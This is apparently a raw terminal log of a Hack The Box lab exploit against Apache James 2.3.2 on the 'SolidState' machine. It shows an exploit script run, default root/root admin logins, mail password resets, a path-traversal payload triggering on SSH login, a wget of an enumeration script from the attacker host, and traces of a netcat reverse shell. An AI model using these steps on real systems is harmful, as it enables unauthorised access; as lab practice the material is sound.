@@ -1,0 +1,606 @@
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ vim exploit.py                                                
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ chmod +x exploit.py                                           
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ./exploit.py                                                  
+[-]Usage: python ./exploit.py <ip>                       
+[-]Exemple: python ./exploit.py 127.0.0.1                
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ./python 10.10.10.51                                          
+-bash: ./python: No such file or directory               
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ./exploit.py 10.10.10.51                                      
+[+]Connecting to James Remote Administration Tool...     
+[+]Creating user...         
+[+]Connecting to James SMTP server...                    
+[+]Sending payload...       
+[+]Done! Payload will be executed once somebody logs in. 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ vim exploit                                                   
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ vim exploit.py                                                
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ./exploit.py 10.10.10.51                                      
+[+]Connecting to James Remote Administration Tool...               
+[+]Creating user...              
+[+]Connecting to James SMTP server...                              
+[+]Sending payload...            
+[+]Done! Payload will be executed once somebody logs in.           
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ssh root@10.10.10.51                                          
+The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.                                           
+ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.                                         
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                             
+Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.                                         
+root@10.10.10.51's password:     
+Permission denied, please try again.                               
+root@10.10.10.51's password:     
+Permission denied, please try again.                               
+root@10.10.10.51's password:     
+
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 4555                                       
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+JAMES Remote Administration Tool 2.3.2                             
+Please enter your login and password                               
+Login id:                        
+root                             
+Password:                        
+root                             
+Welcome root. HELP for a list of commands                          
+ls                               
+Unknown command ls               
+HELP                             
+Currently implemented commands:  
+help                                    display this help          
+listusers                               display existing accounts                                                    
+countusers                              display the number of existing accounts                                      
+adduser [username] [password]           add a new user             
+verify [username]                       verify if specified user exist                                               
+deluser [username]                      delete existing user       
+setpassword [username] [password]       sets a user's password     
+setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'                             
+showalias [username]                    shows a user's current email alias                                           
+unsetalias [user]                       unsets an alias for 'user'                                                   
+setforwarding [username] [emailaddress] forwards a user's email to another email address                             
+showforwarding [username]               shows a user's current email forwarding                                      
+unsetforwarding [username]              removes a forward          
+user [repositoryname]                   change to another user repository                                            
+shutdown                                kills the current JVM (convenient when James is run as a daemon)             
+quit                                    close connection           
+adduser test test                
+User test added                  
+quit                             
+Bye                              
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ssh test@10.10.10.51                                          
+test@10.10.10.51's password:     
+Permission denied, please try again.                               
+test@10.10.10.51's password:     
+Permission denied, please try again.                               
+test@10.10.10.51's password:     
+
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 4555                                       
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+JAMES Remote Administration Tool 2.3.2                             
+Please enter your login and password                               
+Login id:                        
+test                             
+Password:                        
+test                             
+Login failed for test            
+Login id:                        
+root                             
+Password:                        
+root                             
+Welcome root. HELP for a list of commands                          
+HELP                             
+Currently implemented commands:  
+help                                    display this help          
+listusers                               display existing accounts                                                    
+countusers                              display the number of existing accounts                                      
+adduser [username] [password]           add a new user             
+verify [username]                       verify if specified user exist                                               
+deluser [username]                      delete existing user       
+setpassword [username] [password]       sets a user's password     
+setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'                             
+showalias [username]                    shows a user's current email alias                                           
+unsetalias [user]                       unsets an alias for 'user'                                                   
+setforwarding [username] [emailaddress] forwards a user's email to another email address                             
+showforwarding [username]               shows a user's current email forwarding                                      
+unsetforwarding [username]              removes a forward          
+user [repositoryname]                   change to another user repository                                            
+shutdown                                kills the current JVM (convenient when James is run as a daemon)             
+quit                                    close connection           
+adduser test test                
+User test already exists         
+Error adding user test           
+listuesrs                        
+Unknown command listuesrs        
+listusers                        
+Existing accounts 7              
+user: james                      
+user: ../../../../../../../../etc/bash_completion.d                
+user: thomas                     
+user: john                       
+user: mindy                      
+user: mailadmin                  
+user: test                       
+exit                             
+Unknown command exit             
+quit                             
+Bye                              
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 119                                        
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+200 solidstate NNTP Service Ready, posting permitted               
+test                             
+500 Unknown command              
+test                             
+500 Unknown command              
+help                             
+100 Help text follows            
+.                                
+
+500 Unknown command              
+HELP                             
+100 Help text follows            
+.                                
+
+500 Unknown command              
+exit                             
+500 Unknown command              
+quit                             
+205 closing connection           
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 4555                                       
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+JAMES Remote Administration Tool 2.3.2                             
+Please enter your login and password                               
+Login id:                        
+root                             
+Password:                        
+root                             
+Welcome root. HELP for a list of commands                          
+setpassword mailadmin password   
+Password for mailadmin reset     
+quit                             
+Bye                              
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 4555                                       
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+JAMES Remote Administration Tool 2.3.2                             
+Please enter your login and password                               
+Login id:                        
+root                             
+Password:                        
+root                             
+Welcome root. HELP for a list of commands                          
+listusers                        
+Existing accounts 7              
+user: james                      
+user: ../../../../../../../../etc/bash_completion.d                
+user: thomas                     
+user: john                       
+user: mindy                      
+user: mailadmin                  
+user: test                       
+setpassword thomas password      
+Password for thomas reset        
+setpassword john password        
+Password for john reset          
+set password mindy password      
+Unknown command set password mindy password                        
+setpassword mindy password       
+Password for mindy reset         
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ setpassword james password                                    
+-bash: setpassword: command not found                              
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ telnet 10.10.10.51 4555                                                                                                                                                             
+Trying 10.10.10.51...            
+Connected to 10.10.10.51.        
+Escape character is '^]'.        
+JAMES Remote Administration Tool 2.3.2                             
+Please enter your login and password                               
+Login id:                        
+root                             
+Password:                        
+root                             
+Welcome root. HELP for a list of commands                          
+setpassword james password       
+Password for james reset         
+quit                             
+Bye                              
+Connection closed by foreign host.                                 
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ssh mindy@10.10.10.51                                         
+mindy@10.10.10.51's password:    
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686                                     
+
+The programs included with the Debian GNU/Linux system are free software;                                            
+the exact distribution terms for each program are described in the                                                   
+individual files in /usr/share/doc/*/copyright.                    
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                    
+permitted by applicable law.     
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142           
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <4054205.0.1588967989077.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 897                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 15:59:48 -0400 (EDT)                     
+Date: Fri, 8 May 2020 15:59:48 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <5839625.1.1588968167064.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 444                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 16:02:47 -0400 (EDT)                     
+Date: Fri, 8 May 2020 16:02:47 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+mindy@solidstate:~$ ls           
+bin  user.txt                    
+mindy@solidstate:~$ cat user.txt 
+914d0a4ebc177889b5b89a23f556fd75 
+mindy@solidstate:~$ wget http://10.10.14.19:8000/LinEnum.sh               
+-rbash: wget: command not found      
+mindy@solidstate:~$ which culr       
+-rbash: which: command not found     
+mindy@solidstate:~$ which curl       
+-rbash: which: command not found     
+mindy@solidstate:~$ ls           
+bin  user.txt                    
+mindy@solidstate:~$ ls /bin      
+bash          cp             grep        lowntfs-3g      ntfs-3g        ping6       systemctl                       uncompress                                                                                                             
+bunzip2       cpio           gunzip      ls              ntfs-3g.probe  ps          systemd                         unicode_start                                                                                                          
+busybox       dash           gzexe       lsblk           ntfscat        pwd         systemd-ask-password            vdir                                                                                                                   
+bzcat         date           gzip        lsmod           ntfscluster    rbash       systemd-escape                  wdctl                                                                                                                  
+bzcmp         dd             hciconfig   mkdir           ntfscmp        readlink    systemd-hwdb                    which                                                                                                                  
+bzdiff        df             hostname    mknod           ntfsfallocate  rm          systemd-inhibit                 ypdomainname                                                                                                           
+bzegrep       dir            ip          mktemp          ntfsfix        rmdir       systemd-machine-id-setup        zcat                                                                                                                   
+bzexe         dmesg          journalctl  more            ntfsinfo       rnano       systemd-notify                  zcmp                                                                                                                   
+bzfgrep       dnsdomainname  kbd_mode    mount           ntfsls         run-parts   systemd-sysusers                zdiff                                                                                                                  
+bzgrep        domainname     kill        mountpoint      ntfsmove       sed         systemd-tmpfiles                zegrep                                                                                                                 
+bzip2         dumpkeys       kmod        mt              ntfsrecover    setfacl     systemd-tty-ask-password-agent  zfgrep                                                                                                                 
+bzip2recover  echo           less        mt-gnu          ntfssecaudit   setfont     tailf                           zforce                                                                                                                 
+bzless        egrep          lessecho    mv              ntfstruncate   setupcon    tar                             zgrep                                                                                                                  
+bzmore        false          lessfile    nano            ntfsusermap    sh          tempfile                        zless                                                                                                                  
+cat           fgconsole      lesskey     nc              ntfswipe       sh.distrib  touch                           zmore                                                                                                                  
+chacl         fgrep          lesspipe    nc.traditional  open           sleep       true                            znew                                                                                                                   
+chgrp         findmnt        ln          netcat          openvt         ss          udevadm                          
+chmod         fuser          loadkeys    netstat         pidof          stty        ulockmgr_server                  
+chown         fusermount     login       networkctl      ping           su          umount                           
+chvt          getfacl        loginctl    nisdomainname   ping4          sync        uname                            
+mindy@solidstate:~$ ls bin       
+cat  env  ls                     
+mindy@solidstate:~$ env          
+-rbash: env: command not found   
+mindy@solidstate:~$ cd bin       
+-rbash: cd: restricted           
+mindy@solidstate:~$ ls           
+bin  user.txt                    
+mindy@solidstate:~$ ls bin       
+cat  env  ls                     
+mindy@solidstate:~$ cat          
+^C                               
+mindy@solidstate:~$ cat env      
+cat: env: No such file or directory                                
+mindy@solidstate:~$ ls -al bin   
+total 8                          
+drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 .                       
+drwxr-x--- 4 mindy mindy 4096 Sep  8  2017 ..                      
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -> /bin/cat         
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /bin/env         
+lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls           
+mindy@solidstate:~$ env          
+-rbash: env: command not found   
+mindy@solidstate:~$ bin/env      
+-rbash: bin/env: restricted: cannot specify `/' in command names                                                     
+mindy@solidstate:~$ export       
+declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1001/bus"                                                   
+declare -x HOME="/home/mindy"    
+declare -x LANG="en_US.UTF-8"    
+declare -x LOGNAME="mindy"       
+declare -x MAIL="/var/mail/mindy"                                  
+declare -x OLDPWD                
+declare -rx PATH="/home/mindy/bin"                                 
+declare -x PWD="/home/mindy"     
+declare -rx SHELL="/bin/rbash"   
+declare -x SHLVL="1"             
+declare -x SSH_CLIENT="10.10.14.19 44228 22"                       
+declare -x SSH_CONNECTION="10.10.14.19 44228 10.10.10.51 22"       
+declare -x SSH_TTY="/dev/pts/0"  
+declare -x TERM="screen-256color"                                  
+declare -x USER="mindy"          
+declare -x XDG_RUNTIME_DIR="/run/user/1001"                        
+declare -x XDG_SESSION_ID="20"   
+mindy@solidstate:~$ ls           
+bin  user.txt                    
+mindy@solidstate:~$ bin          
+-rbash: bin: command not found   
+mindy@solidstate:~$ ls bin       
+cat  env  ls                     
+mindy@solidstate:~$ ls -al       
+total 28                         
+drwxr-x--- 4 mindy mindy 4096 Sep  8  2017 .                       
+drwxr-xr-x 4 root  root  4096 Aug 22  2017 ..                      
+-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_history           
+-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_logout            
+-rw-r--r-- 1 root  root   338 Aug 22  2017 .bash_profile           
+-rw-r--r-- 1 root  root  1001 Aug 22  2017 .bashrc                 
+drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 bin                     
+-rw------- 1 root  root     0 Aug 22  2017 .rhosts                 
+-rw------- 1 root  root     0 Aug 22  2017 .shosts                 
+drw------- 2 root  root  4096 Aug 22  2017 .ssh                    
+-rw------- 1 mindy mindy   33 Sep  8  2017 user.txt                
+mindy@solidstate:~$ ls -al bin   
+total 8                          
+drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 .                       
+drwxr-x--- 4 mindy mindy 4096 Sep  8  2017 ..                      
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -> /bin/cat         
+lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /bin/env         
+lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls           
+mindy@solidstate:~$ env          
+-rbash: env: command not found   
+mindy@solidstate:~$ nc           
+-rbash: nc: command not found    
+mindy@solidstate:~$ exit         
+logout                           
+Connection to 10.10.10.51 closed.                                  
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ssh mindy@10.10.10.51                                         
+mindy@10.10.10.51's password:    
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686                                     
+
+The programs included with the Debian GNU/Linux system are free software;                                            
+the exact distribution terms for each program are described in the                                                   
+individual files in /usr/share/doc/*/copyright.                    
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                    
+permitted by applicable law.     
+Last login: Fri May  8 16:40:59 2020 from 10.10.14.19              
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <4054205.0.1588967989077.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 897                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 15:59:48 -0400 (EDT)                     
+Date: Fri, 8 May 2020 15:59:48 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <5839625.1.1588968167064.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 444                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 16:02:47 -0400 (EDT)                     
+Date: Fri, 8 May 2020 16:02:47 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <22181523.2.1588971055469.JavaMail.root@solidstate>                                                      
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 775                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 16:50:55 -0400 (EDT)                     
+Date: Fri, 8 May 2020 16:50:55 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+rm: cannot remove '/tmp/f': No such file or directory              
+(UNKNOWN) [10.10.14.19] 9005 (?) : Connection refused              
+-rbash: $'\r': command not found 
+mindy@solidstate:~$ exit         
+logout                           
+Connection to 10.10.10.51 closed.                                  
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$ ssh mindy@10.10.10.51                                         
+mindy@10.10.10.51's password:    
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686                                     
+
+The programs included with the Debian GNU/Linux system are free software;                                            
+the exact distribution terms for each program are described in the                                                   
+individual files in /usr/share/doc/*/copyright.                    
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                    
+permitted by applicable law.     
+Last login: Fri May  8 16:51:16 2020 from 10.10.14.19              
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <4054205.0.1588967989077.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 897                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 15:59:48 -0400 (EDT)                     
+Date: Fri, 8 May 2020 15:59:48 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <5839625.1.1588968167064.JavaMail.root@solidstate>     
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 444                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 16:02:47 -0400 (EDT)                     
+Date: Fri, 8 May 2020 16:02:47 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+-rbash: $'\r': command not found 
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found               
+-rbash: L: command not found     
+-rbash: attributestLjava/util/HashMap: No such file or directory                                                     
+-rbash: L                        
+         errorMessagetLjava/lang/String: No such file or directory                                                   
+-rbash: L                        
+         lastUpdatedtLjava/util/Date: No such file or directory                                                      
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory                                        
+-rbash: $'L\004nameq~\002L': command not found                     
+-rbash: recipientstLjava/util/Collection: No such file or directory                                                  
+-rbash: L: command not found     
+-rbash: $'remoteAddrq~\002L': command not found                    
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory                                
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found                 
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found                                  
+-rbash: @team.pl>                
+Message-ID: <22181523.2.1588971055469.JavaMail.root@solidstate>                                                      
+MIME-Version: 1.0                
+Content-Type: text/plain; charset=us-ascii                         
+Content-Transfer-Encoding: 7bit  
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost                                                
+Received: from 10.10.14.19 ([10.10.14.19])                         
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 775                                                   
+          for <../../../../../../../../etc/bash_completion.d@localhost>;                                             
+          Fri, 8 May 2020 16:50:55 -0400 (EDT)                     
+Date: Fri, 8 May 2020 16:50:55 -0400 (EDT)                         
+From: team@team.pl               
+
+: No such file or directory      
+^C-rbash: $'\r': command not found                            
+mindy@solidstate:~$ exit                                  
+logout                                                    
+Connection to 10.10.10.51 closed.                         
+arjun@broly:~/Documents/HacktheBox/retired/solidstate$    
